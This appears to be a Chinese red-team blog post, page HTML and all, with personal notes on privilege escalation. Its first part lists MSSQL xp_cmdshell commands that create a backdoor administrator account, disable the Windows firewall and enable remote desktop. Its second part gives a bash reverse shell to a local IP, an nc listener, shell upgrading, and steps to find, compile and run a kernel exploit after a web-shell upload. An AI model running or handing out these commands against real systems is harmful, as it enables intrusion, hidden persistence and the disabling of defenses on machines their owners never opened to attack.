@@ -1,0 +1,494 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"zhoumuyun.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="暂时只有两种提权方式，数据库提权和内核提权">
+<meta property="og:type" content="article">
+<meta property="og:title" content="提权">
+<meta property="og:url" content="http://zhoumuyun.com/2024/01/13/%E6%8F%90%E6%9D%83/index.html">
+<meta property="og:site_name" content="Error">
+<meta property="og:description" content="暂时只有两种提权方式，数据库提权和内核提权">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/Liuxunzhang/tuchuang/main/lxz/202401132047770.png">
+<meta property="article:published_time" content="2024-01-13T13:14:23.000Z">
+<meta property="article:modified_time" content="2024-01-13T13:16:31.180Z">
+<meta property="article:author" content="Zhou muyun">
+<meta property="article:tag" content="红队">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/Liuxunzhang/tuchuang/main/lxz/202401132047770.png">
+
+<link rel="canonical" href="http://zhoumuyun.com/2024/01/13/%E6%8F%90%E6%9D%83/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>提权 | Error</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+    <a target="_blank" rel="noopener" href="https://Liuxunzhang/Liuxunzhang.github.io" class="github-corner" aria-label="View source on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#151513; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Error</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://zhoumuyun.com/2024/01/13/%E6%8F%90%E6%9D%83/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar2.gif">
+      <meta itemprop="name" content="Zhou muyun">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Error">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          提权
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2024-01-13 21:14:23 / 修改时间：21:16:31" itemprop="dateCreated datePublished" datetime="2024-01-13T21:14:23+08:00">2024-01-13</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">渗透笔记</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>暂时只有两种提权方式，数据库提权和内核提权</p>
+<span id="more"></span>
+
+<h2 id="数据库提权"><a href="#数据库提权" class="headerlink" title="数据库提权"></a>数据库提权</h2><h3 id="Windows有自带的数据库"><a href="#Windows有自带的数据库" class="headerlink" title="Windows有自带的数据库"></a>Windows有自带的数据库</h3><p><img src="https://raw.githubusercontent.com/Liuxunzhang/tuchuang/main/lxz/202401132047770.png"></p>
+<h3 id="在数据库查询进行提权"><a href="#在数据库查询进行提权" class="headerlink" title="在数据库查询进行提权"></a>在数据库查询进行提权</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">RECONFIGURE</span><br><span class="line">EXEC sp_configure &#x27;show advanced options&#x27;,1</span><br><span class="line">RECONFIGURE</span><br><span class="line">EXEC sp_configure &#x27;xp_cmdshell&#x27;,1</span><br><span class="line">exec master..xp_cmdshell &#x27;net user admin 1qaz@WSX /add&#x27;</span><br><span class="line">exec master..xp_cmdshell &#x27;net localgroup administrators admin /add&#x27;</span><br><span class="line">exec master..xp_cmdshell &#x27;netsh firewall set opmode disable&#x27;</span><br><span class="line">exec master..xp_cmdshell &#x27;REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 0 /f&#x27;</span><br><span class="line">exec master..xp_cmdshell &#x27;netstat -anop tcp | find &quot;3389&quot;&#x27;</span><br></pre></td></tr></table></figure>
+
+<h3 id="提权数据解释"><a href="#提权数据解释" class="headerlink" title="提权数据解释"></a>提权数据解释</h3><h4 id="指定数据库"><a href="#指定数据库" class="headerlink" title="指定数据库"></a>指定数据库</h4><p><code>USE master</code>: 指定当前数据库环境为 master</p>
+<h4 id="刷新服务器"><a href="#刷新服务器" class="headerlink" title="刷新服务器"></a>刷新服务器</h4><p><code>RECONFIGURE</code>: 不重新启动 SQL Server 的情况下重新配置服务器</p>
+<h4 id="显示高级选项"><a href="#显示高级选项" class="headerlink" title="显示高级选项"></a>显示高级选项</h4><p><code>EXEC sp_configure &#39;show advanced options&#39;,1</code>: 启用显示高级选项，允许更改一些高级配置。 </p>
+<h4 id="继续刷新服务器"><a href="#继续刷新服务器" class="headerlink" title="继续刷新服务器"></a>继续刷新服务器</h4><p><code>RECONFIGURE</code>: 不重新启动 SQL Server 的情况下重新配置服务器</p>
+<h4 id="启用xp-cmdshell"><a href="#启用xp-cmdshell" class="headerlink" title="启用xp_cmdshell"></a>启用xp_cmdshell</h4><p><code>EXEC sp_configure &#39;xp_cmdshell&#39;,1</code>: 启用了 <code>xp_cmdshell</code> 这个特性，它允许执行操作系统级别的命令。 </p>
+<h4 id="创建用户"><a href="#创建用户" class="headerlink" title="创建用户"></a>创建用户</h4><p>这里的..是调用的意思，调用xp_cmdshell，然后再cmd里面进行操作</p>
+<p><code>exec master..xp_cmdshell &#39;net user admin 1qaz@WSX /add&#39;</code>: 创建一个名为 “admin” 的用户，密码是 “1qaz@WSX”</p>
+<h4 id="添加到管理员组"><a href="#添加到管理员组" class="headerlink" title="添加到管理员组"></a>添加到管理员组</h4><p>将自己创建的用户，添加到管理员组中，提升自己创建用户的权限</p>
+<p><code>exec master..xp_cmdshell &#39;net localgroup administrators admin /add&#39;</code>: 将刚刚创建的 “admin” 用户添加到本地管理员组中，赋予管理员权限。</p>
+<h4 id="关闭防火墙"><a href="#关闭防火墙" class="headerlink" title="关闭防火墙"></a>关闭防火墙</h4><p>将防火墙的模式设置为disable</p>
+<p><code>exec master..xp_cmdshell &#39;netsh firewall set opmode disable&#39;</code>: 关闭防火墙（Windows 防火墙）</p>
+<h4 id="启用远程桌面连接"><a href="#启用远程桌面连接" class="headerlink" title="启用远程桌面连接"></a>启用远程桌面连接</h4><p>使用REG ADD命令来修改注册表</p>
+<p>远程桌面的路径：HKLM\SYSTEM\CurrentControlSet\Control\Terminal” “Server</p>
+<p> 设置注册表的值：&#x2F;v fDenyTSConnections</p>
+<p>指定要设置的值：&#x2F;t REG_DWORD</p>
+<p>禁止远程桌面连接的功能被禁用：&#x2F;d 0</p>
+<p>不显示任何确认信息：&#x2F;f  强制执行命令</p>
+<p> <code>exec master..xp_cmdshell &#39;REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal /v fDenyTSConnections /t REG_DWORD /d 0 /f&#39;</code>: 修改注册表，启用远程桌面连接，允许远程桌面连接到这台计算机。</p>
+<p>这条命令是在注册表中设置了一个名为 <code>fDenyTSConnections</code> 的项，将其值设为 <code>0</code>，这样的设置将允许远程桌面连接到这台计算机。通常情况下，远程桌面连接默认的端口为 <code>3389</code>，当远程桌面服务启用且防火墙允许时，其他计算机可以通过远程桌面协议连接到该计算机，并进行远程管理或操作</p>
+<h4 id="查找3389的tcp连接"><a href="#查找3389的tcp连接" class="headerlink" title="查找3389的tcp连接"></a>查找3389的tcp连接</h4><p><code>exec master..xp_cmdshell &#39;netstat -anop tcp | find &quot;3389&quot;&#39;</code>: 查找正在使用端口 3389 的 TCP 连接，通常这是远程桌面连接的默认端口。</p>
+<h3 id="net命令解释"><a href="#net命令解释" class="headerlink" title="net命令解释"></a>net命令解释</h3><p> <strong>net</strong>:<br>命令用于执行各种网络相关的操作，如管理用户、组、共享资源、网络连接等。它有许多子命令，可以执行不同的任务，例如： </p>
+<ul>
+<li><ul>
+<li><code>net user</code>: 用于管理系统用户账户，比如创建、删除、修改用户账户的命令。</li>
+<li><code>net share</code>: 用于管理共享资源，允许用户访问文件、打印机等共享资源。</li>
+<li><code>net view</code>: 查看网络上可用的计算机列表。</li>
+<li><code>net use</code>: 连接或断开共享资源的访问。</li>
+<li>等等。</li>
+</ul>
+</li>
+</ul>
+<p><strong>netsh</strong>:<br>用于配置和监视网络设置的命令行工具。它的功能更为广泛，可以用于管理各种网络组件和服务。通过 <code>netsh</code> 命令，可以进行网络接口配置、防火墙设置、网络路由配置、WLAN 设置等。例如；5555： </p>
+<ul>
+<li><ul>
+<li><code>netsh interface</code>: 用于配置网络接口，包括启用、禁用接口、设置 IP 地址、修改 DNS 设置等。</li>
+<li><code>netsh firewall</code>: 用于配置防火墙规则，可以开启或关闭防火墙，管理端口规则、应用程序规则等。</li>
+<li><code>netsh routing</code>: 用于配置和管理网络路由。</li>
+<li><code>netsh wlan</code>: 用于配置和管理 WLAN（无线局域网）设置。</li>
+</ul>
+</li>
+</ul>
+<p>总的来说，<code>net</code> 命令更专注于用户账户、共享资源等方面的管理，而 <code>netsh</code> 命令则更专注于系统网络配置和服务的管理。两者结合使用可以对 Windows 系统的网络功能进行全面的管理和配置。</p>
+<h2 id="内核漏洞提权"><a href="#内核漏洞提权" class="headerlink" title="内核漏洞提权"></a>内核漏洞提权</h2><p>当用文件上传蚁剑连接后，权限只是网站权限，需要提权</p>
+<p>而且蚁剑的交互只是半交互，只能过去，回来受限</p>
+<p>可以用反弹shell，提升成全交互式</p>
+<h4 id="提升成全交互"><a href="#提升成全交互" class="headerlink" title="提升成全交互"></a>提升成全交互</h4><p>利用反弹shell，将shell发送到本地ip的4444端口</p>
+<p><strong>bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.200.133&#x2F;4444 0&gt;&amp;1</strong></p>
+<p>本地用<strong>nc -nvlp 4444</strong>监听4444端口</p>
+<p>利用python将交互式提升</p>
+<p><strong>python -c ‘import pty; pty.spawn(“&#x2F;bin&#x2F;bash”)’</strong></p>
+<p>这里的shell还只是半交互式</p>
+<p>还需要进一步提升</p>
+<p>先用 <strong>ctrl+z</strong>退出</p>
+<p>然后后用<strong>stty raw -echo;fg;reset</strong> 继续连接，这里的shell已经成为全交互式</p>
+<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p>先用<strong>uname -a</strong>去找到拿到的linux系统的版本号</p>
+<p>利用漏洞工具searchesploit去找Linux版本相应的漏洞，然后过滤本地提权的漏洞</p>
+<p><strong>searchsploit 2.6.3l grep local</strong></p>
+<p>这里找到<strong>15285.c</strong>的漏洞</p>
+<p>用<strong>locate</strong>去定位漏洞位置</p>
+<p>将漏洞位置复制到当前目录，然后进行传输</p>
+<p>这里我们是用蚁剑连接，可以直接拖到<strong>shell的tmp目录</strong>中（因为当前用户的权限很低，其他目录没有操作权限，只有tmp目录有权限）</p>
+<p>cd到shell的tmp目录，然后将.c文件进行编译成名字为exp的文件</p>
+<p><strong>gcc 15285.c -o exp</strong></p>
+<p>将exp文件增加可执行权限</p>
+<p><strong>chmod +x exp</strong> </p>
+<p>然后直接.<strong>&#x2F;exp执行文件</strong>就可以获取权限</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E7%BA%A2%E9%98%9F/" rel="tag"># 红队</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2024/01/13/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" rel="prev" title="文件上传">
+      <i class="fa fa-chevron-left"></i> 文件上传
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2024/01/13/%E6%94%BB%E5%87%BB%E6%BA%AF%E6%BA%90/" rel="next" title="攻击溯源">
+      攻击溯源 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83"><span class="nav-number">1.</span> <span class="nav-text">数据库提权</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Windows%E6%9C%89%E8%87%AA%E5%B8%A6%E7%9A%84%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="nav-number">1.1.</span> <span class="nav-text">Windows有自带的数据库</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9C%A8%E6%95%B0%E6%8D%AE%E5%BA%93%E6%9F%A5%E8%AF%A2%E8%BF%9B%E8%A1%8C%E6%8F%90%E6%9D%83"><span class="nav-number">1.2.</span> <span class="nav-text">在数据库查询进行提权</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8F%90%E6%9D%83%E6%95%B0%E6%8D%AE%E8%A7%A3%E9%87%8A"><span class="nav-number">1.3.</span> <span class="nav-text">提权数据解释</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%8C%87%E5%AE%9A%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="nav-number">1.3.1.</span> <span class="nav-text">指定数据库</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%B7%E6%96%B0%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="nav-number">1.3.2.</span> <span class="nav-text">刷新服务器</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%98%BE%E7%A4%BA%E9%AB%98%E7%BA%A7%E9%80%89%E9%A1%B9"><span class="nav-number">1.3.3.</span> <span class="nav-text">显示高级选项</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BB%A7%E7%BB%AD%E5%88%B7%E6%96%B0%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="nav-number">1.3.4.</span> <span class="nav-text">继续刷新服务器</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%90%AF%E7%94%A8xp-cmdshell"><span class="nav-number">1.3.5.</span> <span class="nav-text">启用xp_cmdshell</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%9B%E5%BB%BA%E7%94%A8%E6%88%B7"><span class="nav-number">1.3.6.</span> <span class="nav-text">创建用户</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%B7%BB%E5%8A%A0%E5%88%B0%E7%AE%A1%E7%90%86%E5%91%98%E7%BB%84"><span class="nav-number">1.3.7.</span> <span class="nav-text">添加到管理员组</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%85%B3%E9%97%AD%E9%98%B2%E7%81%AB%E5%A2%99"><span class="nav-number">1.3.8.</span> <span class="nav-text">关闭防火墙</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%90%AF%E7%94%A8%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E8%BF%9E%E6%8E%A5"><span class="nav-number">1.3.9.</span> <span class="nav-text">启用远程桌面连接</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9F%A5%E6%89%BE3389%E7%9A%84tcp%E8%BF%9E%E6%8E%A5"><span class="nav-number">1.3.10.</span> <span class="nav-text">查找3389的tcp连接</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#net%E5%91%BD%E4%BB%A4%E8%A7%A3%E9%87%8A"><span class="nav-number">1.4.</span> <span class="nav-text">net命令解释</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83"><span class="nav-number">2.</span> <span class="nav-text">内核漏洞提权</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%8F%90%E5%8D%87%E6%88%90%E5%85%A8%E4%BA%A4%E4%BA%92"><span class="nav-number">2.0.1.</span> <span class="nav-text">提升成全交互</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-number">2.0.2.</span> <span class="nav-text">提权</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Zhou muyun"
+      src="/images/avatar2.gif">
+  <p class="site-author-name" itemprop="name">Zhou muyun</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">27</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">12</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/Liuxunzhang" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Liuxunzhang" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:liuxunzhang1@gmail.com" title="E-Mail → mailto:liuxunzhang1@gmail.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Zhou muyun</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
